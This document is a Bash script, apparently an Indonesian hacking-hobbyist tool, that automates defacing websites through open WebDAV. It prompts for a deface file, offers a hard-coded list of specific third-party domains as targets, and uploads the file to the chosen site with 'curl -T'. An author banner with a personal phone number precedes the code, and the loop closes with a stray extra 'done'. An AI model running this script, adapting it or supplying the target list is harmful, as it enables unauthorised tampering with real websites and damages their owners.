#!/bin/bash
#Coded By GUS10N
#WEBDAV
#Knp Lihat-Lihat
#Mau Recode?Dosa Gan
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard
figlet -f pagga WEBDAV | lolcat

clear
echo _____________________________________________ | lolcat
toilet -f future "GUS10N"
echo $i "Author : GUS10N"
echo $i "WA     : +6285332814651"
echo $i "Github : https://github.com/Moreno-ID"
echo $i "Team   : NoTeam[NeedTeam]"
echo _____________________________________________ | lolcat

echo ""
echo $ku "*note:"
echo $me"|----------------------------------------|"
echo $me"|"$i"Script Deface Letakkan Di Sdcard"$me"|"
echo $me"|"$i"Dan Jangan Taruh Di Folder"  $me "|"
echo $me"|----------------------------------------|"
echo ""
echo -n $ku"Script Deface Kamu:"
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $me"CTRL+C DmTerDeteksi, Exit" | lolcat
echo ""
echo $ne" Byee,Kawan" | lolcat
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Belum Punya Web Target?";
echo $me"[--------"$pu"---------------]"
echo $me"["$ku"2"$me"]" $pu"Sudah Punya Web Target?";
echo ""
echo    "╭─PILIH BRO:" |lolcat
read -p "╰─#" pil;

case $pil in
1)echo ""
echo $pu"List Target:"
echo $pu"--------------------------"
echo $me"
http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.co.z
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://holotropicbreathwork.co.za
http://foodconsult.co.za
http://daretogowildafrica.co.za
http://hybriddevelopments.co.za

"

echo ""
echo $pu"---------------------------------------"
echo -n $i"Masukan Salah Satu Target:"
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"--------------------------------------"
echo $ku"Silakan Di Cek di $cy $tg/$sc"
echo $me"--------------------------------------"

exit

;;


2)echo -n $i"Masukan Target:"
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter..."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"--------------------------------------"
echo $ku"Silakan Di Cek di $cy $tg/$sc"
echo $me"--------------------------------------"

exit

;;


*) echo " CARI YANG ADA DI LIST AJA BRO " | lolcat
esac
done
done
